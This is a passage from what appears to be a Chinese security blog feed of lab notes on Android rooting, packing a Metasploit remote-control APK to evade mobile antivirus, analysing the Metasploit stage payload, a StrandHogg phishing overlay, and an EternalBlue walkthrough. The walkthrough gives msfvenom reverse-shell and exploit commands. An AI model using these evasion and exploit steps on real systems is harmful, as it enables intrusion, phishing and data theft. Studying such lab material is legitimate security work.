分区镜像文件，刷入镜像。</li></ul><p>这里使用到了一个工具fastboot，它是一个PC设备通过USB或TCP/UDP与Bootloader通讯的协议，可以使用它，刷入第三方ROM。我们平时说的“线刷”,就是通过USB将手机连接至PC，使用fastboot直接将system.img、boot.img、recovery.img烧写入设备。</p><p>系统推送更新使用的是“卡刷”，将系统更新包下载至手机存储空间（以前是sd卡），然后进入recovery启动模式，加载更新包。进入recovery模式时，已经加载了部分文件系统，所以才能读取存储空间的update.zip更新包，但是仅限于厂商的官方系统固件。</p><p>如果我们想要更新第三方固件，就需要刷入第三方recovery.img，只能“线刷”，使用更底层的fastboot。</p><h2 id="刷入第三方Recovery"><a href="#刷入第三方Recovery" class="headerlink" title="刷入第三方Recovery"></a>刷入第三方Recovery</h2><p>首先，Android设备有几个分区，有各自的功能，能够进行单独的格式化和读写。比如执行命令<code>fastboot flash boot boot.img</code>可以更新boot分区。</p><ul><li><p>/boot分区，系统启动引导程序和内核，系统正常启动用的就是boot.img</p></li><li><p>/system分区，存放Android系统框架和相关配置，系统预装应用等，可通过recovery刷入新的ROM。只能读不能写，传统的root方法就是再这个分区动手脚</p></li><li><p>/recovery分区，包括一个完整的内核和一些特殊的Recovery binary，能够读取固件更新其他分区。system分区损坏时，可进入此分区刷入新的ROM，恢复系统正常使用，或者系统升级时，重启设备进入recovery模式，加载update.zip包</p></li><li><p>/data分区，用户数据区，存储用户安装的应用、短信、设置等信息。恢复出厂设置即擦除data分区</p></li><li><p>/cache分区，存储用户经常访问的数据和应用程序组件，清楚后会自动重建，不会影响系统运行</p></li></ul><p>使用fastboot将第三方Recovery镜像刷入recovery分区，这里推荐使用TWRP。下载地址：<a href="https://twrp.me/Devices/" target="_blank" rel="noopener">https://twrp.me/Devices/</a>。</p><ul><li><p>找到与设备品牌型号对应的镜像，点进去（以Mi max 2为例）</p><p><img src="twrp1.png" alt=""></p></li><li><p>找到twrp镜像的下载入口，点进去下载最新版本的镜像，保存至本地；</p><p><img src="twrp2.png" alt=""></p></li><li><p>设备进入fastboot后，连接至PC端，打开cmd终端，切换至刚刚下载的twrp镜像的目录，并执行<code>fastboot flash recovery xxxx.img</code>，这里“xxxx.img”即为下载的twrp固件</p></li><li><p>重启，<code>fastboot reboot</code>，为了防止重启时回到原来的系统，需要在输入重启命令后，按住recovery快捷键,启动到TWRP</p></li></ul><p>刷入TWRP后，就可以实现更多功能，如刷入Supersu.zip获取并管理root权限等。</p><h2 id="Magisk"><a href="#Magisk" class="headerlink" title="Magisk"></a>Magisk</h2><p>获取和管理root权限一般使用supersu和Magisk。但是，Android8之后Supersu停止更新了。Supersu修改了system分区，加了一些新文件到system分区。Android8之后Google加强了安全校验（SafetyNat接口<a href="https://developer.android.com/training/safetynet/attestation" target="_blank" rel="noopener">https://developer.android.com/training/safetynet/attestation</a>，具体原理在这里挖个坑，后面再来填坑吧），system分区被修改后会向检测设备是否root的应用返回警告。而Magisk使用了systemless root，修改了系统的boot分区，没有动system分区，就绕过了SafetyNet接口的检查。</p><p><strong>Magisk 安装</strong>有两种方法：</p><ol><li>下载Magisk安装包放在存储区，重启设备，进入recovery模式，启动TWRP，点击TWRP的“安装”按钮，找到Magisk安装包，点击安装，重启设备即可。</li><li>不刷入第三方recovery，直接安装Magisk。参考：<a href="https://topjohnwu.github.io/Magisk/install.html" target="_blank" rel="noopener">https://topjohnwu.github.io/Magisk/install.html</a>。首先，在官网下载与自己手机型号匹配的系统固件包，提取其中的boot.img文件，并传入手机。在手机中安装Magisk Manager,修补boot.img,生成patchedboot.img,并将其传入PC端。在通过PC端命令行执行<code>adb reboot bootloader</code>进入Bootloader，执行<code>fastboot boot Patchedboot.img</code>刷入修改后的boot分区文件，获取临时root。最后，进入MagisK Manager，选择install–直接安装，才能获得永久root权限。</li></ol><p>方法一实际安装过程如下：</p><p>下载Maisk安装包：<a href="https://github.com/topjohnwu/Magisk/releases" target="_blank" rel="noopener">https://github.com/topjohnwu/Magisk/releases</a>，放进手机。</p><p>进入recovery模式：</p><p><img src="IMG_20201217_091435__01.jpg" alt=""></p><p>在存储空间找到Magisk刷机包，点击开始加载：</p><p><img src="IMG_20201217_094051__01.jpg" alt=""></p><p>这里刷入时报了一个错误：</p><p><img src="1A71B00C-1D76-420a-A5DE-D5C958940F59.png" alt=""></p><p>(忘记留图片了，这个图片是搜解决方法时找到的，跟我的报错一样)</p><p>提示：<code>Please restore stock boot image</code>。以为是MagisK版本问题，从V17试到V21都不行。最后发现，原来是我之前使用Supersu root过，boot.img被修改了，需要在TRWP中卸载root。点击进入<code>高级</code>选项，可以看到一个<code>清除Root</code>按钮，点击后，TWRP将会重新刷入boot.img。</p><p><img src="IMG_20201217_110651__01.jpg" alt=""></p><p>清除Root完成后，再重新刷入Magisk,就可以了。</p><p><img src="IMG_20201217_103148__01.jpg" alt=""></p><p>重启系统，打开MagiskManager应用，可以看到：</p><p><img src="Screenshot_2020-12-17-10-39-47-291_com.topjohnwu.magisk.jpg" alt=""></p><p>说明已经安装完成了。</p><p><strong>Magisk实现原理：</strong>由于它是通过启动时在 boot 中创建钩子，把 /data/magisk.img 挂载到 /magisk，构建出一个在 system 基础上能够自定义替换，增加以及删除的文件系统，所有操作都在启动的时候完成，实际上并没有对 /system 分区进行修改（即 systemless 接口，以不触动 /system 的方式修改 /system）。</p><p>开发者手册：<a href="https://topjohnwu.github.io/Magisk/guides.html" target="_blank" rel="noopener">https://topjohnwu.github.io/Magisk/guides.html</a>。后续可根据需要开发一些模块，本地安装至Magisk。</p><p><img src="Screenshot_2020-12-17-11-16-00-773_com.topjohnwu.magisk.jpg" alt=""></p><p>参考文献：</p><p>【1】<a href="https://github.com/topjohnwu/Magisk" target="_blank" rel="noopener">https://github.com/topjohnwu/Magisk</a></p><p>【2】<a href="https://android.googlesource.com/platform/system/core/+/master/fastboot/README.md" target="_blank" rel="noopener">https://android.googlesource.com/platform/system/core/+/master/fastboot/README.md</a></p><p>【3】<a href="https://www.52pojie.cn/thread-816065-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-816065-1-1.html</a></p><p>【4】<a href="https://www.52pojie.cn/thread-903485-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-903485-1-1.html</a></p><p>【5】<a href="https://www.jianshu.com/p/393f5e51716e" target="_blank" rel="noopener">https://www.jianshu.com/p/393f5e51716e</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;*郑重声明：本文内容只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们的最终目标是获取设备root权限，之后就可以实现我们想要但手机厂商没有提供的功能了。&lt;/p&gt;
&lt;p&gt;Android设备root有两个思
      
    
    </summary>
    
    
      <category term="Android实验笔记" scheme="http://yoursite.com/categories/Android%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>远控免杀实验笔记（一）</title>
    <link href="http://yoursite.com/2020/07/16/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2020/07/16/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-07-16T05:44:48.000Z</published>
    <updated>2020-07-16T08:19:12.145Z</updated>
    
    <content type="html"><![CDATA[<h1 id="远控免杀实验笔记（一）"><a href="#远控免杀实验笔记（一）" class="headerlink" title="远控免杀实验笔记（一）"></a>远控免杀实验笔记（一）</h1><p><strong><em>郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</em></strong></p><p>msf远控程序直接安装在手机上，会被安全卫士识别为病毒。移动端安全卫士识别病毒有两种方式，一种是依靠特征码扫描，即应用包名和签名；一种是主动防御，监控高危的API调用。因此，考虑给应用加个壳，也就是将原本的dex文件加密，在应用运行时再动态解密加载。</p><p>Android应用加固目前已经发展的比较成熟了，为了不重复造轮子，同时我们加壳的目的并不是防止反编译，只是为了隐藏代码，直接找一个开源的加壳工具就可以了。</p><p>加壳原理参考博客：<a href="https://blog.csdn.net/LVXIANGAN/article/details/84956476" target="_blank" rel="noopener">https://blog.csdn.net/LVXIANGAN/article/details/84956476</a></p><p>工具下载地址：<a href="https://github.com/lvxiangan/Android-Shell2" target="_blank" rel="noopener">https://github.com/lvxiangan/Android-Shell2</a></p><p><strong>加壳步骤：</strong></p><ol><li>反编译原远控apk, 增加Application类，并相应的修改AndroidManifest.xml.</li></ol><p><img src="image-20200716152115679.png" alt=""></p><p><img src="image-20200716152328477.png" alt=""></p><ol start="2"><li><p>回编译后重新打包，签名。经过测试，可以连通~</p></li><li><p>修改解壳程序的Manifest文件，将远控apk的Manifest文件中的权限，和Application标签中的内容拷贝过来，注意Application标签和Activity等四大组件的android:name属性，要补全包名。</p><p><img src="image-20200716154729049.png" alt=""></p><p>然后，Build工程，生成解壳apk。</p></li><li><p>将解壳apk中的classes.dex文件拷贝出来，改为shell.dex，与远控apk文件一起放在加密工程的force目录下。运行加密程序即可将远控apk加密，并与shell.dex合并，生成新的classes.dex文件。</p></li><li><p>将生成的classes.dex文件拷贝到解壳apk中，替换原有的clasess.dex。</p></li><li><p>将解壳apk中原有的签名文件删除，即<code>META-INF</code>目录，重新签名。</p></li><li><p>安装测试，可以连通~</p></li></ol><p>安装了主流的三款手机安全卫士都没有检测出来，这一阶段的目标达成~</p><p>但是，存在一个问题：直接adb install 安装应用时，报了<code>adb: failed to install payload-release.apk: Failure [INSTALL_FAILED_TEST_ONLY: installPackageLI]</code>错误。</p><p>可能原因是：</p><ol><li><p>Manifest中设置了<code>android:testOnly=&quot;true&quot;</code>，需要将此属性的值设置为false。然而工程中并没有设置此属性啊，，，</p></li><li><p>gradle文件配置时使用了测试版本,如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    classpath &#39;com.android.tools.build:gradle:4.0.0-alpha&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要将<code>-alpha</code>删掉。然而工程中也并未使用测试版本，，，</p></li></ol><p>暂时的解决方法是，安装时使用<code>adb install -t apk</code>，加一个参数<code>-t</code>，就可以正常安装了。</p><p>当前远控应用不能常驻后台，因此下一个需要解决的问题是连接的稳定性。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;远控免杀实验笔记（一）&quot;&gt;&lt;a href=&quot;#远控免杀实验笔记（一）&quot; class=&quot;headerlink&quot; title=&quot;远控免杀实验笔记（一）&quot;&gt;&lt;/a&gt;远控免杀实验笔记（一）&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;郑重声明：本文展示的过程是在模拟环境中进行的
      
    
    </summary>
    
    
      <category term="Android实验笔记" scheme="http://yoursite.com/categories/Android%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>com.metasploit.stage分析</title>
    <link href="http://yoursite.com/2020/07/01/com-metasploit-stage%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/07/01/com-metasploit-stage%E5%88%86%E6%9E%90/</id>
    <published>2020-07-01T09:23:10.000Z</published>
    <updated>2020-07-16T05:49:44.770Z</updated>
    
    <content type="html"><![CDATA[<h1 id="com-metasploit-stage分析"><a href="#com-metasploit-stage分析" class="headerlink" title="com.metasploit.stage分析"></a>com.metasploit.stage分析</h1><p><strong><em>郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</em></strong></p><p>先分析客户端（移动设备上apk），再分析msf端的原理，透彻理解服务端控制客户端的原理。</p><h2 id="1-反编译"><a href="#1-反编译" class="headerlink" title="1.反编译"></a>1.反编译</h2><p>首先，反编译生成的apk文件。将apk文件拖入jeb工具中，可以看到此apk的主要类结构。从Manifest文件可以看出，应用入口为MainActivity，设置了<code>android:theme</code>为<code>“@android:style/Theme.NoDisplay”</code>，即不显示。定义了一个MainBroadcastReceiver，接收设备已启动广播。在Mainservice中执行主要操作。</p><p><img src="image-20200630154246007.png" alt=""></p><h2 id="2-调用入口"><a href="#2-调用入口" class="headerlink" title="2.调用入口"></a>2.调用入口</h2><p>在MainActivity和MainBroadcastReceiver中的onCreate和onReceive方法中均调用了<code>MainService.startService</code>。看一下MainService的代码：</p><p><img src="image-20200630161204397.png" alt=""></p><p>在startService()方法中，启动了MainService服务，会调用onStartCommand方法，传入Context参数。onStartCommand方法中，调用了关键类<code>Payload</code>的start方法。看一下代码：</p><p><img src="image-20200630161730343.png" alt=""></p><p>注意，方法中调用了<code>startInPath</code>方法，并传入了Context.getFilesDir().toString。getFilesDir()方法用于获取/data/data/<application package>/files目录，即应用的私有目录。Payload.a是一个byte[]静态常量，和应用私有目录一起初始化了Payload.h。</p><p>然后，进入类e。该类代码如下:</p><p><img src="image-20200630162622935.png" alt=""></p><p>可以看到只是新起了一个线程来执行Payload.main()方法。</p><h2 id="3-Payload类"><a href="#3-Payload类" class="headerlink" title="3.Payload类"></a>3.Payload类</h2><h3 id="3-1-main"><a href="#3-1-main" class="headerlink" title="3.1 main()"></a>3.1 main()</h3><p>回到Payload类，main方法：</p><p><img src="image-20200630163037019.png" alt=""></p><p>传进来的参数的null,执行<code>a v6 = b.a(Payload.a);</code>，即对byte[]常量Payload.a进行一系列位运算（怀疑是某种加密算法），返回类a的实例。</p><h3 id="3-2-关键代码"><a href="#3-2-关键代码" class="headerlink" title="3.2 关键代码"></a>3.2 关键代码</h3><p>关键代码如下，即对Payload.a解析出的数据进行一系列操作：</p><p><img src="image-20200630174353882.png" alt=""></p><p>在while循环中，对String类型的变量v7进行判断。v7来自g对象的String变量a，而g对象来自Payload.a解析后生成的a类型的对象中的LinkedList类型变量d的第0个元素。</p><p>v7判断处有两个分支：以“tcp”开头和以“https”开头。</p><p>若以“tcp”开头，则对v7进行格式化，根据格式化的代码：</p><p><img src="image-20200630172642154.png" alt=""></p><p>可以看出，v7的格式为：<code>tcp://ip:port</code>. v3_1即为ip, v2_1即为端口号。然后，建立Socket连接，如下图：</p><p><img src="image-20200630172930068.png" alt=""></p><p>若以“https”开头，则调用类a的a()方法解析请求，代码如下：</p><p><img src="image-20200630173204517.png" alt=""></p><p>然后，调用类f的a()方法,初始化SSLSocket连接:</p><p><img src="image-20200630173801701.png" alt=""></p><h3 id="3-3-Paload-a"><a href="#3-3-Paload-a" class="headerlink" title="3.3 Paload.a()"></a>3.3 Paload.a()</h3><p> 建立Socket或SSLSocket连接后，调用了Payload.a()方法传输文件：</p><p><img src="image-20200630175301744.png" alt=""></p><p>首先，从远程下载jar文件到本地，然后，加载该文件，再通过反射调用start()方法。</p><h3 id="3-4-分析远程下载的文件"><a href="#3-4-分析远程下载的文件" class="headerlink" title="3.4 分析远程下载的文件"></a>3.4 分析远程下载的文件</h3><p>从上图可以看到，调用DexClassLoader.loadClass()方法，执行动态加载，随即删除了从远程下载的文件。为了查看从远程下载的文件内容是什么，需要修改文件，重新打包此应用。找到Payload.smali文件中对应的delete语句，将其删除即可，如下图：</p><p><img src="image-20200701140248112.png" alt=""></p><p>重新打包签名（PS：签名一完成，windows自带的扫描工具就扫描出了病毒。。。。），安装，执行，在/data/data/com.metasploit.stage/files目录下，找到了下载的文件：</p><p><img src="image-20200701142807469.png" alt=""></p><p>反编译jar包，可以得到：</p><p><img src="image-20200701150116368.png" alt=""></p><p>可以看到，这里的方法就是Payload类中通过反射调用的start()方法。start()方法通过读取数据流，以及加载dex文件，就可以执行远程指令。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;com-metasploit-stage分析&quot;&gt;&lt;a href=&quot;#com-metasploit-stage分析&quot; class=&quot;headerlink&quot; title=&quot;com.metasploit.stage分析&quot;&gt;&lt;/a&gt;com.metasploit.stage
      
    
    </summary>
    
    
      <category term="Android实验笔记" scheme="http://yoursite.com/categories/Android%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>StrandHogg漏洞分析笔记-copy</title>
    <link href="http://yoursite.com/2020/03/26/StrandHogg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0-copy/"/>
    <id>http://yoursite.com/2020/03/26/StrandHogg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0-copy/</id>
    <published>2020-03-26T09:21:53.000Z</published>
    <updated>2020-03-26T09:49:16.028Z</updated>
    
    <content type="html"><![CDATA[<p><strong>*郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</strong></p><p><img src="t01fc7d99b17a8596c0.png" alt=""></p><p>又是一个神不知鬼不觉盗取用户隐私信息的漏洞，用户实惨。。。</p><p>StrangHogg漏洞是一个存在于Android多任务系统中的应用漏洞。攻击者通过设置AndroidManifest.xml文件中组件的android:taskAffinity属性即可利用此漏洞进行钓鱼等攻击。 当用户点击受害应用时，可直接弹出恶意应用界面， 伪装成另一个应用欺骗用户的重要账号密码，申请读取短信、联系人等权限，从而获取隐私信息。并且，此漏洞更加隐蔽的地方在于，即使用户查看后台应用也不会发现此时有两个看起来一样的应用在运行，危害极大！</p><p><img src="2019121212104067758.jpg" alt=""></p><p><img src="2019121212105243270.jpg" alt=""></p><p>了解StrandHogg漏洞的原理，关键在 android:taskAffinity属性 。那么，首先就需要了解下Activity栈（Task，也可以叫做任务）。</p><p>Activity栈是一种管理Activity界面的结构，遵循“后进先出”规则。位于栈顶的Activity获取屏幕的焦点，当按下“back”按钮时，栈顶Activity弹出，前一个Activity重新获取焦点。</p><p>一般情况下，同一个应用程序中启动的Activity位于一个栈中，多个应用程序同时运行时，查看后台应用，可以看到多个任务栈。官方提供了 <code>android:taskAffinity</code> 这一属性，使得不同应用的Activity也可以进入同一个栈（Task）中。官方翻译为“ 从概念上讲，具有同一相似性的 Activity 归属同一Task（从用户的角度来看，则是归属同一“应用”） ”。每个Activity都有taskAffinity属性，指明它启动时进入的Task。若没有显式指定，就遵循其所在的Application标签中的该属性。若Application标签中也没指定，taskAffinity属性值就是包名。</p><p>如果想要单独给某个Activity设定一个任务栈，就需要设置<code>TaskAffinity</code>属性。除此之外，还需将Activity的启动模式即<code>android:lunchMode</code>属性设置为<code>singleTop</code>,或是启动Activity时设置<code>FLAG_ACTIVITY_NEW_TASK</code>。</p><p>StrandHogg漏洞涉及到的另一个属性是android:allowTaskReparenting。官方解释为： 当下一次将启动 Activity 的任务转至前台时，Activity 是否能从该任务转移至与其有相似性的任务 —“<code>true</code>”表示可以转移，“<code>false</code>”表示仍须留在启动它的任务处。 读起来相当拗口。在这里，当恶意应用设置了android:taskAffinity属性值为受害应用的taskAffinity值（大多为包名），然后将 android:allowTaskReparenting属性设置为true，那么，先点击恶意应用，再启动受害应用时，跳出来的就是恶意应用的界面。事实上，受害应用的Activity也启动了，只不过恶意应用瞬间就重新寄宿到受害应用的Task中，导致受害应用的界面被覆盖掉。</p><p><strong>案例：</strong>下面视频以某宝为例演示钓鱼实验过程</p><p><img src="test1.gif" alt=""></p><p>步骤为：点击恶意应用（某宝1）-&gt; 点击返回键 -&gt; 点击受害应用（某宝）。可以看到登录页面被无缝覆盖。仔细观察也能发现钓鱼页面与原页面不同，不过要是一门心思使坏，也能做到页面、图标与受害应用一模一样。</p><p>查看后台应用，也只有一个应用：</p><p><img src="Screenshot_20191219-173012.png" alt=""></p><p>打开山寨应用，查看当前Activity栈信息，发现其TaskRecorder是“com.eg.android.AlipayGphone”，即受害应用包名。</p><p><img src="D83B603F-FCBB-4ede-856E-977D02779A84.png" alt=""></p><p>攻击成功时，Activity栈信息，如下图：</p><p><img src="1867749D-BDED-49d0-AA15-58BAFA26E4AF.png" alt=""></p><p>实际场景中，攻击成功是需要条件的。android:allowTaskReparenting属性和 android:taskAffinity属性是将恶意应用的某Activity与受害应用的Activity关联，使其启动时进入同一个Task。因此，攻击并不是每次都能成功，必须是恶意应用先启动，然后再启动受害应用。<br>另一个需要克服的问题是，必须保证恶意应用进程一直在后台运行，而不被杀死。</p><p>对我来说，实验中耗费时间最长的就是制作钓鱼页面了。。。页面布局是个大坑啊。不过若只是想假冒应用获取敏感权限，就不需要会费心思制作输入框了，截个图就行了。（当然只是实验环境，胆小如我并没有找别人测试。）</p><p>这个功能是系统提供的，即使被用作钓鱼，也不会被手机自带的杀毒软件识别出来。再加上某些非手机自带“安全”APP的特点，对于没有安全基础的广大Android用户来说，可能唯一的方法就是不安装来源不明的软件了。</p><p>今天看到工信部公布了第一批侵害用户权益的APP名单，希望我们广大Android用户的使用体验能越来越好吧~</p><p>参考文献：<br>（1） <a href="https://developer.android.com/guide/topics/manifest/activity-element" target="_blank" rel="noopener">https://developer.android.com/guide/topics/manifest/activity-element</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;*郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;t01fc7d99b17a8596c0.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;又是一个神
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>永恒之蓝实验笔记-copy</title>
    <link href="http://yoursite.com/2020/03/26/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0-copy/"/>
    <id>http://yoursite.com/2020/03/26/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0-copy/</id>
    <published>2020-03-26T09:13:01.000Z</published>
    <updated>2020-03-26T09:35:18.466Z</updated>
    
    <content type="html"><![CDATA[<p><strong>*郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</strong></p><p>先放上参考链接：<br>（1） <a href="https://github.com/rapid7/metasploit-framework/pull/9473" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/9473</a><br>（2） <a href="https://www.youtube.com/watch?v=jrql8dJoEH0" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jrql8dJoEH0</a><br>（3） <a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">https://github.com/worawit/MS17-010</a></p><p>本次实验的目标一共四个：win7 , win xp , win server 2003, win server 2012.<br>实验环境是kali, 工具是metasploit.</p><p>第一步，扫描目标ip端，可以使用goby(<a href="https://gobies.org/#dl)，或nmap。Windows环境下可以使用goby，可以扫出漏洞信息，但是不好分辨目标操作系统版本。goby对win10用户很不友好，所以选择了在kali中使用nmap。直接执行`nmap" target="_blank" rel="noopener">https://gobies.org/#dl)，或nmap。Windows环境下可以使用goby，可以扫出漏洞信息，但是不好分辨目标操作系统版本。goby对win10用户很不友好，所以选择了在kali中使用nmap。直接执行`nmap</a> 192.168.27.0-145 -O`即可扫描该ip段的设备操作系统信息，稍等一会扫描结束才会显示结果，着急的人也可以折磨Enter键来查看进度。聪明的小伙伴这时候就选择了界面版nmap，而不是像本人一样，努力瞪大眼睛在黑漆漆的背景下搜寻那几个渺小的字母。。。（emmm其实可以使用终端的搜索直接定位windows关键字的）</p><p>定位到目标IP和对应的操作系统后就可以开始实验了。</p><p>第二步，打开在终端输入<code>msfconsole</code>,进入msf。<br>输入<code>search ms17-010</code>，所搜可利用模块。</p><p>以下介绍不同版本操作系统的利用方法。</p><h3 id="1-win-7"><a href="#1-win-7" class="headerlink" title="1. win 7"></a>1. win 7</h3><p>执行以下命令即可获取Guest用户的shell:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueset rhosts 192.168.27.107exploit</span><br></pre></td></tr></table></figure><h3 id="2-win-xp-和win-server-2003"><a href="#2-win-xp-和win-server-2003" class="headerlink" title="2. win xp 和win server 2003"></a>2. win xp 和win server 2003</h3><p>这两个的利用方法一样，就放在一起吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_commandset rhost 192.168.27.227exploit</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexecset rhost 192.168.27.227exploit</span><br></pre></td></tr></table></figure><h3 id="3-win-server-2012"><a href="#3-win-server-2012" class="headerlink" title="3. win server 2012"></a>3. win server 2012</h3><p>参考文章开头的<a href="https://www.youtube.com/watch?v=jrql8dJoEH0" target="_blank" rel="noopener">视频教程</a>,先<a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">下载exploit包</a>。</p><p>根据视频中的内容，首先需要安装nasm编译工具（这里不再详细说了），再将下载的exploit包解压，使用nasm工具编译其中的eternalblue_kshellcode_x64.asm文件。再使用msfvenom工具生成木马程序，在目标主机上执行。即可在本地监听通信。</p><p>以下为主要步骤：</p><p>(1) 切换至exploit包的<code>shellcode</code>目录；<br>(2）<code>nasm -f bin eternalblue_kshellcode_x64.asm</code> ，可以看到生成了eternalblue_kshellcode_x64文件；<br>(3) <code>msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o meterpreter_msf.bin EXITFUNC=thread LHOST=192.168.27.241 LPORT=4444</code>，可以看到生产了meterpreter_msf.bin文件（LHOST为本地主机ip）；<br>(4)<code>cat eternalblue_kshellcode_x64 meterpreter_msf.bin &gt; meterpreter.bin</code><br>(5) 将<code>meterpreter.bin</code>文件复制到上一层目录；<br>(6)切换至上一层目录，即exploit包的根目录，执行<code>gedit eternalblue_eploit8.py</code>, 将USERNAME改为’Gusest’，并保存；</p><p>(7) 另起一个终端，进入<code>msfconsole</code><br>(8) <code>use exploit/multi/handler</code><br>(9) <code>set payload windows/x64/meterpreter/reverse_tcp</code><br>(10) <code>set lhost 192.168.27.241</code><br>(11) <code>set lport 4444</code><br>(12) <code>exploit</code>，开启监听</p><p>（13）回到刚才的终端，执行脚本，将exploit和木马程序meterpreter.bin发送至目标主机：<br><code>python eternalblue_exploit8.py 192.168.27.67 meterpreter.bin</code></p><p>顺利的话，这里就应该能看到msf监听到的通信建立过程了，然而，执行完最后一个命令msf终端毫无反应。没有什么是一帆风顺的，这正是时间的常理。</p><p>经过老大的提示，在命令后加个500就可以了！果然！成功了！Yeah!</p><p>那这个500是啥呢，经过一番搜索发现， 它是一个安全标识符(SID)，是标识用户、组和计算机账户的唯一号码。两次创建统一名称的账户，分配给它的SID是不同的。通常情况下SID是唯一的，很多值都是固定的，比如500代表管理员账号Administrator，501代表Guest账号。</p><p>emmm不过当时没有注意是guest账户还是Administrator账户，下次可以看下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;*郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先放上参考链接：&lt;br&gt;（1） &lt;a href=&quot;https://github.com/rapid7/meta
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="windows" scheme="http://yoursite.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Hook框架配置备忘录-copy</title>
    <link href="http://yoursite.com/2020/03/26/Hook%E6%A1%86%E6%9E%B6%E9%85%8D%E7%BD%AE%E5%A4%87%E5%BF%98%E5%BD%95-copy/"/>
    <id>http://yoursite.com/2020/03/26/Hook%E6%A1%86%E6%9E%B6%E9%85%8D%E7%BD%AE%E5%A4%87%E5%BF%98%E5%BD%95-copy/</id>
    <published>2020-03-26T08:35:46.000Z</published>
    <updated>2020-10-16T09:18:03.870Z</updated>
    
